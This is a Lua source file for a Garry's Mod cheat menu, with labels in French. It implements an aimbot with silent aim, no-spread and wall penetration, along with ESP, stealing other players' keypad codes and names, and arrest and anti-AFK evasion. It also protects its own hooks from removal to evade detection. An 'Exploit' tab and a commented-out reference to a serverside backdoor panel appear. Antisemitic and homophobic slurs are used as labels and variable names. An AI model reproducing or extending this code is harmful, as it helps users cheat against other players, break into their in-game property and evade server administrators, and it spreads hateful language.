ZNX.MakeFunctionButton( Utility, 120, 450, "Enlever l'Alarme", function() RunConsoleCommand("LokiDev_base_remove") end, "Supprimer la base" )
ZNX.MakeToggleButton( Utility, 350, 330, "Keypad Juif", "KeypadJew", "Keypad Juif", "Voler les codes des keypads des joueurs pour rentrer dans leur base")
ZNX.MakeToggleButton( Utility, 5, 420, "RP Anti Arrestation", "DodgeArrest", "RP Anti Arrestation", "Se suicide automatiquement si quelqu'un essaie de vous frapper avec un bâton d'arrestation")
ZNX.MakeToggleButton( Utility, 120, 420, "Mort = Changer Nom", "NewLifeRule", "Mort = Changer Nom", "Changer automatiquement de nomrp quand vous mourrez")
--ZNX.MakeToggleButton( Utility, 235, 420, "Dodge Physgun", "DontTouchMeThere", "Suicide When PhysGunned", "Don't touch me there, that's my private place")
ZNX.MakeFunctionButton( Utility, 235, 420, "Anti Anti-AFK", function() RunConsoleCommand("fgtnoafk") end, "Anti Anti-AFK")
ZNX.MakeFunctionButton( Utility, 350, 420, "Clientside NoClip", function() ZNX.Toggle() end, "Clientside NoClip")
ZNX.MakeFunctionButton( Utility, 5, 540, "FPS Booster", function() StopLAG() end, "FPS Booster")
ZNX.MakeToggleButton( Utility, 350, 570, "Rechargement Auto", "AutoReload", "Rechargement Auto", "Rechargement Automatique")
--[[ZNX.MakeToggleButton( Utility, 235, 570, "Anti Chute Dégât", "SafeJump", "Anti Chute Dégât", "System qui fait spawn un props a vos pied des que vous etes proche du sol\nUtilisé Touche pour Anti Chute Dégât + activé moi ")
local ttttt = vgui.Create( "DLabel", Utility )
ttttt:SetPos( 16, 568 )
ttttt:SetText( "Touche pour \nAnti Chute Dégât :" )
ttttt:SizeToContents()
ZNX.MakeKeyBinder( Utility, 120, 570, 110, 25, "SafeJumpBindKey", "falldamage" )--]]
ZNX.MakeToggleButton( Botsettings, 5, 10, "Aimbot Normal", "Aimbot", "Aimbot Normal", "Activé / Désactivé le Aimbot Normal\nQuand le Aimbot Normal et activé l'ancien aimbot se désactive tout seul !!!")
ZNX.MakeToggleButton( Botsettings, 120, 40, "Aimbot quand tu Tire", "SnapOnFire", "Aimbot quand tu Tire", "Active le aimbot quand tu appuye sur tiré")
ZNX.MakeToggleButton( Botsettings, 5, 40, "Tire Automatique", "AutoShoot", "Tire Automatique", "Votre aimbot fait maintenant tout le travail pour vous, vous pouvez maintenant afk et vous masturber x)")
--ZNX.MakeToggleButton( Botsettings, 350, 70, "Rapid Fire", "AutoTrigger", "Rapid Fire", "Spams the trigger on semi auto weapons when locked on and holding left click")
ZNX.MakeToggleButton( Botsettings, 235, 220, "Touche Aimbot", "AimbotBindMode", "Touche Aimbot", "Active le aimbot quand la touche et présser je conseil de l'activé pour etre plus legit")
ZNX.MakeToggleButton( Botsettings, 235, 40, "M9K Travers Mur", "AimbotWallbanger", "M9K Travers Mur", "Aimbot les joueurs si le pistolet actuel est capable de pénétrer dans le mur / l'objet qu'ils sont caché derrière")
ZNX.MakeToggleButton( Botsettings, 235, 10, "Afficher Position Cible", "PreviewTarget", "Afficher Position Cible", "Affiche la position actuelle / suivante sur laquelle le aimbot se verrouille")
ZNX.MakeToggleButton( Botsettings, 350, 10, "Pas de Propagation", "CompSpread", "Pas de Propagation", "Fonctionne avec m9k, hl2, ttt, et quelques autres bases d'armes simples. Ne fonctionne pas avec fas2 ou cw2 !!")
ZNX.MakeToggleButton( Botsettings, 350, 40, "Silent Aim", "SilentAim", "Silent Aim", "Alors, le silent aim c'est un system qui permet de pouvoir aimbot des joueurs meme quand vous les regarder pas,\nAbusé avec un fov de 180, je conseil de mettre un fv pas trop élever genre 20-40")
ZNX.MakeToggleButton( Botsettings, 235, 70, "Ciblage Adaptatif", "AimbotAdaptiveTarget", "Ciblage Adaptatif", "Tirez sur n'importe quelle partie de leur corps qui est exposée, pas seulement leur tête.\nTotalement abusé lorsqu'il est associé a Pas de Propagation et M9K Travers Mur")
ZNX.MakeToggleButton( Botsettings, 5, 160, "Cibler les Amis", "TargetFriends", "Cibler les Amis", "Voulez-vous vraiment trahir vos amis comme ça? :(")
ZNX.MakeToggleButton( Botsettings, 120, 160, "Cibler les Admins", "TargetAdmins", "Cibler les Admins", "Fait pleurer qu'elle que admins lol")
ZNX.MakeToggleButton( Botsettings, 235, 160, "Cibler même Équipe", "TargetSameTeam", "Cibler même Équipe", "Voulez-vous trahir votre équipe?")
ZNX.MakeToggleButton( Botsettings, 350, 160, "Cibler que les Cibles", "TargetHighlighted", "Cibler que les Cibles", "Pour tué les cibles seulement")
ZNX.MakeToggleButton( Botsettings, 120, 190, "Cibler les Noclippeurs", "TargetNoclippers", "Cibler les Noclippeurs", "Vous ne pouvez généralement pas les tuer de toute façon, alors pourquoi s'embêter?")
ZNX.MakeToggleButton( Botsettings, 5, 190, "Préférez Tire Tete", "AimbotTargetMode", "Préférez Tire Tete", "Ciblez les têtes ou allez directement au centre ?")
ZNX.MakeToggleButton( Botsettings, 235, 190, "Maintenir la Cible", "AimbotStickyLock", "Maintenir la Cible", "Aimbot ne changera pas de cible tant que la cible actuelle n'est pas morte ou n'est plus visible sur votre fov")
ZNX.MakeToggleButton( Botsettings, 350, 190, "Cibler que le Murder", "TargetMurder", "Cibler que le Murder", "Cibler uniquement le murder?\nFonctionne uniquement dans le gamemode murder!!!!")
ZNX.MakeFunctionButton( Botsettings, 120, 10, "Ancien Aimbot", function() AA:OpenMenu() end, "L'ancien aimbot fonctionne mieux sur l'arme Crossbow sinon pour toutes les autre armes le Aimbot normal est largement mieux !")
local tttt = vgui.Create( "DLabel", Botsettings )
tttt:SetPos( 15, 225 )
tttt:SetText( "Touche du Aimbot:" )
tttt:SizeToContents()
ZNX.MakeKeyBinder( Botsettings, 120, 220, 110, 25, "AimbotBindKey", "aimbot" )
ZNX.MakeSlider( Botsettings, 5, 70, 225, "Vitesse de Visée", 0, 30, "AimbotSmooth" )
ZNX.MakeSlider( Botsettings, 5, 100, 225, "Distance Maximum", 0, 9999, "AimbotDist" )
ZNX.MakeSlider( Botsettings, 235, 100, 225, "Champ de Vision", 0.1, 180, "AimbotMaxFOV" )
local TextEntry = vgui.Create( "DTextEntry", Utility )
TextEntry:SetPos( 5, 90 )
TextEntry:SetSize( 225, 25 )
TextEntry:SetText( ZNX.NameStealName )
TextEntry.OnEnter = function( self )
ZNX.NameStealName = self:GetValue()
timer.Simple(1,function() LocalPlayer():ConCommand("say /rpname "..self:GetValue().."   ") end)
if ZNX.Vars.Notifications then ZNX.ChatText( "Set my name to: "..self:GetValue(), Color(255,255,255) ) end
end
local TextEntry = vgui.Create( "DTextEntry", Utility )
TextEntry:SetPos( 5, 240 )
TextEntry:SetSize( 450, 25 )
TextEntry:SetText( ZNX.ChatSpamText )
TextEntry.OnEnter = function( self )
ZNX.ChatSpamText = self:GetValue()
if ZNX.Vars.Notifications then ZNX.ChatText( "Message de chatspam défini sur: "..self:GetValue(), Color(255,255,255) ) end
end
ZNX.MakeFunctionButton( Debug, 5, AceMenu:GetTall() - 110, "Effacer la Console", function() table.Empty(ZNX.Debug) end)
ZNX.MakeFunctionButton( Debug, 120, AceMenu:GetTall() - 110, "Ajouter le Serveur", function() ZNX.AddServer() end)
ZNX.MakeFunctionButton( Debug, 235, AceMenu:GetTall() - 110, "Afficher Serveur(s)", function() ZNX.LoadServeur() end)
ZNX.MakeFunctionButton( Debug, 350, AceMenu:GetTall() - 110, "Supprimer Serveur(s)", function() ZNX.DeleteServeur() end)
--ZNX.MakeFunctionButton( Debug, 235, Menu:GetTall() - 110, "Game Event Logging", function() end)
--ZNX.MakeFunctionButton( Debug, 350, Menu:GetTall() - 110, "Extensive Logging", function() end)
PropertySheet:AddSheet( "ESP", General, "icon16/zoom.png", false, false, "ESP/Xray/HUD" )
--PropertySheet:AddSheet( "Vision Advanced", General2, "icon16/zoom_in.png", false, false, "ESP/Xray/HUD settings" )
PropertySheet:AddSheet( "Utilitaire", Utility, "icon16/wrench.png", false, false, "Outils et utilitaires" )
PropertySheet:AddSheet( "Aimbot", Botsettings, "icon16/bomb.png", false, false, "Paramétre Aimbot" )
PropertySheet:AddSheet( "Exploit", Exploit, "icon16/bug.png", false, false, "Lua Exploit" )
--PropertySheet:AddSheet( "Backdoor", Backdoor, "icon16/door_in.png", false, false, "Control panel for the Wraithnet/HTX serverside backdoor" )
PropertySheet:AddSheet( "Debug", Debug, "icon16/printer.png", false, false, "Debug Console" )
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
return end
concommand.Add("LokiDevs_Menu", ZNX.Menu)
------------------------------------------------------------------------DEBUG CONSOLE SHIT--------------------------------------------------------------------------------------
function ZNX.DebugLog( str, col )
table.insert(ZNX.Debug, {str, col})
if #ZNX.Debug > 40 then
table.remove( ZNX.Debug, 1 )
end
end
------------------------------------------------------------------------ENT MARKER MENU--------------------------------------------------------------------------------------
-- Simple Anti AFK Script / Load before it bug 
local oneTwo = false      
local preventAfk = false       
local function moveAround()      
if oneTwo then           
RunConsoleCommand( "+forward" )      
RunConsoleCommand( "+right" )            
timer.Simple( 0.5, function()         
RunConsoleCommand( "-forward" )      
RunConsoleCommand( "-right" )   
LocalPlayer():SetEyeAngles(LocalPlayer():EyeAngles() + Angle(math.Rand(-20,20),math.Rand(-180,180),0))
oneTwo = !oneTwo       
end )      
else       
RunConsoleCommand( "+back" )      
RunConsoleCommand( "+left" )            
timer.Simple( 0.5, function()      
RunConsoleCommand( "-back" )      
RunConsoleCommand( "-left" )           
oneTwo = !oneTwo       
end )      
end      
end      
local function runLoop()       
if preventAfk then moveAround() end      
timer.Simple( 1, runLoop )       
end       
timer.Simple( 1, runLoop )       
concommand.Add( "fgtnoafk", function( ply, cmd, args )       
preventAfk = !preventAfk       
end )     
local OtherEnts = {}
function ZNX.EntMarkerMenu()
if EMenu then return end
table.Empty(OtherEnts)
for k,v in pairs(ents.GetAll()) do
local addToAllEnts = true
for i,p in pairs(ZNX.MarkedEnts) do
if p == v:GetClass() then
addToAllEnts = false
end
end
for i,p in pairs(OtherEnts) do
if p == v:GetClass() then
addToAllEnts = false
end
end
if addToAllEnts then
table.insert(OtherEnts, v:GetClass())
end
end
local EMenu = vgui.Create("DFrame")
EMenu:SetSize(500,485)
EMenu:SetTitle("Entité Menu")
EMenu:Center()
EMenu:MakePopup()
EMenu.Paint = function()
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( 0, 0, EMenu:GetWide(), EMenu:GetTall() )
surface.SetDrawColor( Color(155, 155, 155, 255) )
surface.DrawOutlinedRect( 0, 0, EMenu:GetWide(), EMenu:GetTall() )
surface.DrawOutlinedRect( 1, 1, EMenu:GetWide() - 2, EMenu:GetTall() - 2 )
surface.SetDrawColor( Color(0, 0, 0, 200) )
surface.DrawRect( 10, 25, EMenu:GetWide() - 20, EMenu:GetTall() - 35 )
end
DermaList = vgui.Create( "DPanelList", EMenu )
DermaList:SetPos( 25,35 )
DermaList:SetSize( 500, 400 )
DermaList:SetSpacing( 75 )
DermaList:EnableHorizontal( false )
DermaList:EnableVerticalScrollbar( true )
local SelectedEnts = vgui.Create("DListView")
SelectedEnts:SetSize(220, 335)
SelectedEnts:SetPos(0, 0)
SelectedEnts:SetMultiSelect(false)
SelectedEnts:AddColumn("Entité afficher dans ESP")
for k,v in SortedPairs(ZNX.MarkedEnts, false) do
SelectedEnts:AddLine(v)
end
SelectedEnts.DoDoubleClick = function(parent, index, list)
table.remove(ZNX.MarkedEnts, index)
EMenu:rebuildlists()
end
DermaList:Add(SelectedEnts)
local AllEnts = vgui.Create("DListView")
AllEnts:SetSize(220, 335)
AllEnts:SetPos(230, 0)
AllEnts:SetMultiSelect(false)
AllEnts:AddColumn("Entité non afficher dans ESP")
for k,v in SortedPairs(OtherEnts, false) do
AllEnts:AddLine(v)
end
AllEnts.DoDoubleClick = function(parent, index, panel )
table.insert(ZNX.MarkedEnts, OtherEnts[index])
EMenu:rebuildlists()
end
DermaList:Add(AllEnts)
function EMenu:rebuildlists()
table.Empty(OtherEnts)
for k,v in pairs(ents.GetAll()) do
local addToAllEnts = true
for i,p in pairs(ZNX.MarkedEnts) do
if p == v:GetClass() then
addToAllEnts = false
end
end
for i,p in pairs(OtherEnts) do
if p == v:GetClass() then
addToAllEnts = false
end
end
if addToAllEnts then
table.insert(OtherEnts, v:GetClass())
end
end
AllEnts:Clear()
SelectedEnts:Clear()
for k,v in SortedPairs(OtherEnts, false) do
AllEnts:AddLine( v )
end
for k,v in SortedPairs(ZNX.MarkedEnts, false) do
SelectedEnts:AddLine( v )
end
end
ZNX.MakeFunctionButton( EMenu, 25, 380, "Ajouter les Printers", function() 
for k,v in pairs(ents.GetAll()) do 
if string.find(v:GetClass(), "custom_printer") or string.find(v:GetClass(), "rprint") or string.find(v:GetClass(), "bit_miner") or string.find(v:GetClass(), "*_printer") or string.find(v:GetClass(), "print") or string.find(v:GetClass(), "br_money") or string.find(v:GetClass(), "*_money") or string.find(v:GetClass(), "adrug_weed") or string.find(v:GetClass(), "cox_cocaine") or string.find(v:GetClass(), "*_money_printer") or string.find(v:GetClass(), "*_money") or string.find(v:GetClass(), "atila_argent_sale") or string.find(v:GetClass(), "atila_farine_cultivateur") or string.find(v:GetClass(), "rein_kidney") or string.find(v:GetClass(), "atila_machine_blanchisseur") or string.find(v:GetClass(), "*_printer_*") and !table.HasValue(ZNX.MarkedEnts, v:GetClass()) then 
table.insert(ZNX.MarkedEnts, v:GetClass()) 
end 
end 
EMenu:rebuildlists()
end, "Trouve tout ce qui ressemble a un printer")
ZNX.MakeFunctionButton( EMenu, 140, 380, "Ajouter les Armes", function() 
for k,v in pairs(ents.GetAll()) do 
if (string.find(v:GetClass(), "weap") or string.find(v:GetClass(), "fas2") or string.find(v:GetClass(), "m9k") or string.find(v:GetClass(), "cw")) and !table.HasValue(ZNX.MarkedEnts, v:GetClass()) then 
table.insert(ZNX.MarkedEnts, v:GetClass()) 
end 
end 
EMenu:rebuildlists()
end, "Trouve tout ce qui ressemble a des armes")
ZNX.MakeFunctionButton( EMenu, 255, 380, "Ajouter les Vehicles", function() 
for k,v in pairs(ents.GetAll()) do 
if v:IsVehicle() and !table.HasValue(ZNX.MarkedEnts, v:GetClass()) then 
table.insert(ZNX.MarkedEnts, v:GetClass()) 
end 
end 
EMenu:rebuildlists()
end, "Trouve tout ce qui ressemble a des vehicles")
ZNX.MakeFunctionButton( EMenu, 370, 380, "Ajouter les Loots", function() 
for k,v in pairs(ents.GetAll()) do 
if (string.find(v:GetClass(), "item") or string.find(v:GetClass(), "loot")) and !table.HasValue(ZNX.MarkedEnts, v:GetClass()) then 
table.insert(ZNX.MarkedEnts, v:GetClass()) 
end 
end 
EMenu:rebuildlists()
end, "Trouve tout ce qui ressemble a des loots / items (utile pour gmod dayz)")
ZNX.MakeFunctionButton( EMenu, 25, 410, "DarkRP Entités", function() 
for k,v in pairs(ents.GetAll()) do 
if v:GetClass() == "spawned_shipment" or v:GetClass() == "spawned_money" or v:GetClass() == "spawned_weapon" or v:GetClass() == "police_armory" or v:GetClass() == "spawned_ammo" or v:GetClass() == "spawned_food" and !table.HasValue(ZNX.MarkedEnts, v:GetClass()) then 
table.insert(ZNX.MarkedEnts, v:GetClass() ) 
end 
end 
EMenu:rebuildlists()
end, "Trouve tout ce qui ressemble a des entités DarkRP (armes, argent, shipments etc)")
ZNX.MakeFunctionButton( EMenu, 370, 410, "Effacer la liste", function() 
ZNX.MarkedEnts = {}
EMenu:rebuildlists()
end, "Effacer la liste des entités afficher")
local turd = vgui.Create( "DLabel", EMenu )
turd:SetPos( 25, 447 )
turd:SetText( "Recherche classes : " )
turd:SizeToContents()
local target4 = vgui.Create( "DTextEntry", EMenu )
target4:SetPos( 125, 442 )
target4:SetSize( 255, 25 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
if nam == "" then 
ZNX.MarkedEnts = {}
EMenu:rebuildlists()
return
end
local namtab = string.Explode( ", ", nam )
ZNX.MarkedEnts = {}
for _, en in pairs( ents.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( en:GetClass() ), s, 1, true ) then
if !table.HasValue( ZNX.MarkedEnts, en:GetClass() ) then table.insert( ZNX.MarkedEnts, en:GetClass() ) end
end
end
end
EMenu:rebuildlists()
end
end
concommand.Add("LokiDev_ents", ZNX.EntMarkerMenu)
------------------------------------------------------------------------PLAYERS MENU--------------------------------------------------------------------------------------
function ZNX.PlayerMenu()
if PMenu then return end
local PMenu = vgui.Create("DFrame")
PMenu:SetSize(590,420)
PMenu:SetTitle("Players menu")
PMenu:Center()
PMenu:MakePopup()
PMenu.Paint = function()
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( 0, 0, PMenu:GetWide(), PMenu:GetTall() )
surface.SetDrawColor( Color(155, 155, 155, 255) )
surface.DrawOutlinedRect( 0, 0, PMenu:GetWide(), PMenu:GetTall() )
surface.DrawOutlinedRect( 1, 1, PMenu:GetWide() - 2, PMenu:GetTall() - 2 )
surface.SetDrawColor( Color(0, 0, 0, 200) )
surface.DrawRect( 10, 25, PMenu:GetWide() - 20, PMenu:GetTall() - 35 )
end
local Plist = vgui.Create( "DPanelList", PMenu )
Plist:SetSize( 560, 370 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 10, 25 )
Plist:SetName( "" )
for k, v in pairs( player.GetAll() ) do
if v == LocalPlayer() then continue end
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 480, 40 )
plypanel2.Paint = function() -- Paint function
draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 15, 5 )
plyname:SetFont( "Trebuchet18" )
plyname:SetColor( team.GetColor(v:Team()) )
plyname:SetText( "Nom: "..v:Nick() )
plyname:SetSize(180, 15)
if ZNX.GetRank(v) != ( "user" or "guest" or "player" ) then
local rtxt = vgui.Create( "DLabel", plypanel2 )
rtxt:SetPos( 15, 20 )
rtxt:SetFont( "Trebuchet18" )
rtxt:SetColor( Color(255,100,0,255) )
rtxt:SetText( "Grade: "..ZNX.GetRank(v) )
rtxt:SetSize(180, 15)
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 45, 25 )
faggot:SetPos( 200, 8 )
faggot:SetText("Profile")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 200 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
ZNX.ChatText( "Ouverture de la page steam de: "..v:Nick().." ("..v:SteamID()..")", Color(255,255,255) )
v:ShowProfile()
surface.PlaySound("buttons/button7.wav")
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 45, 25 )
faggot:SetPos( 250, 8 )
faggot:SetText("Muet")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
if !v:IsValid() then return end
if v:IsMuted() then
surface.SetDrawColor(200, 100, 000 ,255)
else
surface.SetDrawColor(100, 100, 200 ,255)
end
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
v:SetMuted( !v:IsMuted() )
if v:IsMuted() then ZNX.ChatText( "Muet: "..v:Nick(), Color(255,255,255) ) else ZNX.ChatText( "Démuter: "..v:Nick(), Color(255,255,255) ) end
surface.PlaySound("buttons/button7.wav")
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 70, 25 )
faggot:SetPos( 300, 8 )
faggot:SetText("Voler le nom")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 200 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
LocalPlayer():ConCommand("say /rpname "..v:Nick().."   ")
ZNX.ChatText( "Vous avez voler le nom de: "..v:Nick(), Color(255,255,255) )
surface.PlaySound("buttons/button7.wav")
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 60, 25 )
faggot:SetPos( 375, 8 )
faggot:SetText("CIBLER")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
if ZNX.IsTarget( v ) then
surface.SetDrawColor(100, 200, 100 ,255)
else
surface.SetDrawColor(100, 100, 200 ,255)
end
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
if ZNX.IsTarget( v ) then ZNX.RemoveTarget(v) else ZNX.AddTarget(v) end
surface.PlaySound("buttons/button7.wav")
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 45, 25 )
faggot:SetPos( 440, 8 )
faggot:SetText("Ami")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
if ZNX.IsFriend( v ) then
surface.SetDrawColor(100, 200, 100 ,255)
else
surface.SetDrawColor(100, 100, 200 ,255)
end
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
if ZNX.IsFriend( v ) then ZNX.RemoveFriend(v) else ZNX.AddFriend(v) end
surface.PlaySound("buttons/button7.wav")
end
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( 45, 25 )
faggot:SetPos( 490, 8 )
faggot:SetText("Suivre")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 200 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
faggot.DoClick = function()
if !following then
following = true
if v:IsPlayer() then 
local ID = v:SteamID()
hook.Add("Think", "follow", function()
if v:SteamID()==ID then
local head = v:LookupBone("ValveBiped.Bip01_Head1")
local headpos,headang = v:GetBonePosition(head)
LocalPlayer():SetEyeAngles((headpos - LocalPlayer():GetShootPos()):Angle())
if !saidname then
saidname = true
end
end
end)
LocalPlayer():ConCommand("+forward")
LocalPlayer():ConCommand("+speed")
end
elseif following then
following = false
hook.Remove("Think", "follow")
LocalPlayer():ConCommand("-forward")
LocalPlayer():ConCommand("-speed")
saidname = false
end
surface.PlaySound("buttons/button7.wav")
end
Plist:AddItem( plypanel2 )
end
end
concommand.Add("LokiDev_players", ZNX.PlayerMenu)
------------------------------------------------------------------------BIG MEMES----------------------------------------------------------------------------------------
function ZNX.IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end
------------------------------------------------------------------------DANK NOSPREAD----------------------------------------------------------------------------------------
local penistration = {
["SniperPenetratedRound"] = 20,
["pistol"] = 9,
["357"] = 12,
["smg1"] = 14,
["ar2"] = 16,
["buckshot"] = 5,
["slam"] = 5,
["AirboatGun"] = 17,
}
function ZNX.GetM9gayPenetration( ply, gun, tr, testent )
if !gun.Penetration then return false end
local ammotyp = gun.Primary.Ammo
local penindex = 14
if penistration[ammotyp] then penindex = penistration[ammotyp] end
if tr.MatType == MAT_METAL and ammotyp != "SniperPenetratedRound" then return false end
penindex = penindex - 0.05 -- precaution so we don't botch extreme range shots
local penissize = tr.Normal * penindex
if (tr.MatType == MAT_GLASS or tr.MatType == MAT_PLASTIC or tr.MatType == MAT_WOOD or tr.MatType == MAT_FLESH or tr.MatType == MAT_ALIENFLESH) then
penissize = tr.Normal * (penindex * 2)
end
local ntrace     = {}
ntrace.endpos    = tr.HitPos + tr.Normal * 99999
ntrace.start     = tr.HitPos + penissize
ntrace.mask              = MASK_SHOT
ntrace.filter    = {ply}
local trace     = util.TraceLine(ntrace)
if trace.StartSolid or ( trace.Entity and trace.Entity != testent ) then return false end
return true
end
function ZNX.CanWeaponPenetrate( tr, testent )
local ply = LocalPlayer()
local gun = ply:GetActiveWeapon()
if !ply:IsValid() or !gun or !gun:IsValid() then return false end
if gun.Primary and gun.Primary.Spread and gun.Primary.IronAccuracy then return ZNX.GetM9gayPenetration( ply, gun, tr, testent ) end
return false
end
function ZNX.IsBabyGod( ply )
if !ply:IsValid() or !ply:Alive() or ply:InVehicle() then return false end
if ply:GetRenderMode() == RENDERMODE_TRANSALPHA and ply:GetColor().a == 100 then 
return true
else
return false
end
end
--[[
function ZNX.GetPenetrationStrength( tr ) --heh
if !ZNX.CanWeaponPenetrate() then return 0 end
local ply = LocalPlayer()
local gun = ply:GetActiveWeapon()
if !ply:IsValid() or !gun or !gun:IsValid() then return 0 end
if gun.Primary and gun.Primary.Spread and gun.Primary.IronAccuracy then return ZNX.GetM9gayPenetration( ply, gun ) end
return 0
end
--]]
function ZNX.FixMove( cmd, safe )
local move = Vector( cmd:GetForwardMove(), cmd:GetSideMove(), cmd:GetUpMove() )
local speed = math.sqrt( move.x * move.x + move.y * move.y )
local mang = move:Angle()
local yaw = math.rad( cmd:GetViewAngles().y - ZNX.InternalFakeAngles.y + mang.y )
cmd:SetForwardMove( (math.cos(yaw) * speed) * 1 )
cmd:SetSideMove( math.sin(yaw) * speed )
end
------------------------------------------------------------------------AIMBOT FUNCTIONS--------------------------------------------------------------------------------------
do
local hooks = {}
local created = {}
local function CallHook(self, name, args)
if !hooks[name] then return end
for funcName, _ in pairs(hooks[name]) do
local func = self[funcName]
if func then
local ok, err = pcall(func, self, unpack(args or {}))
if !ok then
ErrorNoHalt(err .. "\n")
elseif err then
return err
end
end
end
end
local function RandomName()
local random = ""
for i = 1, math.random(4, 10) do
local c = math.random(65, 116)
if c >= 91 && c <= 96 then c = c + 6 end
random = random .. string.char(c)
end
return random
end
local function AddHook(self, name, funcName)
if !created[name] then
local random = RandomName()
hook.Add(name, random, function(...) return CallHook(self, name, {...}) end)
created[name] = random
end
hooks[name] = hooks[name] or {}
hooks[name][funcName] = true
end
local cvarhooks = {}
local function GetCallbackTable(convar)
local callbacks = cvars.GetConVarCallbacks(convar)
if !callbacks then
cvars.AddChangeCallback(convar, function() end)
callbacks = cvars.GetConVarCallbacks(convar)
end
return callbacks
end
local function AddCVarHook(self, convar, funcName, ...)
local hookName = "CVar_" .. convar
if !cvarhooks[convar] then
local random = RandomName()
local callbacks = GetCallbackTable(convar)
callbacks[random] = function(...)
CallHook(self, hookName, {...})
end
cvarhooks[convar] = random
end
AddHook(self, hookName, funcName)
end
local oldRemove = hook.Remove
function hook.Remove(name, unique)
if created[name] == unique then return end
oldRemove(name, unique)
end
local function RemoveHooks()
for hookName, unique in pairs(created) do
oldRemove(hookName, unique)
end
for convar, unique in pairs(cvarhooks) do
local callbacks = GetCallbackTable(convar)
callbacks[unique] = nil
end
end
AA.AddHook = AddHook
AA.AddCVarHook = AddCVarHook
AA.CallHook = CallHook
AA.RemoveHooks = RemoveHooks
end
concommand.Add("aa_reload", function()
AA:CallHook("Shutdown")
print("Suppression des hooks...")
AA:RemoveHooks()
AA = nil
local info = debug.getinfo(1, "S")
if info && info.short_src then
if string.Left(info.short_src, 3) == "lua" then
info.short_src = string.sub(info.short_src, 5)
end
print("Rechargement (" .. info.short_src .. ")...")
include(info.short_src)
else
print("Ficher de L'AutoAim non présent, recharger manuellement !.")
end
end)
local function GetMeta(name)
return table.Copy(FindMetaTable(name) or {})
end
local AngM = GetMeta("Angle")
local CmdM = GetMeta("CUserCmd")
local EntM = GetMeta("Entity")
local PlyM = GetMeta("Player")
local VecM = GetMeta("Vector")
do
local settings = {}
local function SettingVar(self, name)
return (self.SettingPrefix or "") .. string.lower(name)
end
local function RandomName()
local random = ""
for i = 1, math.random(4, 10) do
local c = math.random(65, 116)
if c >= 91 && c <= 96 then c = c + 6 end
random = random .. string.char(c)
end
return random
end
local function SetSetting(name, _, new)
if !settings[name] then return end
local info = settings[name]
if info.Type == "number" then
new = tonumber(new)
elseif info.Type == "boolean" then
new = (tonumber(new) or 0) > 0
end
info.Value = new
end
local function CreateSetting(self, name, desc, default, misc)
local cvar = SettingVar(self, name)
local info = {Name = name, Desc = desc, CVar = cvar, Type = type(default), Value = default}
for k, v in pairs(misc or {}) do
if !info[k] then info[k] = v end
end
if type(default) == "boolean" then
default = default and 1 or 0
end
if !settings[cvar] then
local tab = cvars.GetConVarCallbacks(cvar)
if !tab then
cvars.AddChangeCallback(cvar, function() end)
tab = cvars.GetConVarCallbacks(cvar)
end
while true do
local name = RandomName()
if !tab[name] then
tab[name] = SetSetting
info.Callback = name
break
end
end
end
settings[cvar] = info
settings[#settings + 1] = info
CreateClientConVar(cvar, default, (info.Save != false), false)
SetSetting(cvar, _, GetConVarString(cvar))
end
local function GetSetting(self, name)
local cvar = SettingVar(self, name)
if !settings[cvar] then return end
return settings[cvar].Value
end
local function Shutdown()
print("Removing settings callbacks...")
for _, info in ipairs(settings) do
if info.CVar && info.Callback then
local tab = cvars.GetConVarCallbacks(info.CVar)
if tab then
tab[info.Callback] = nil
end
end
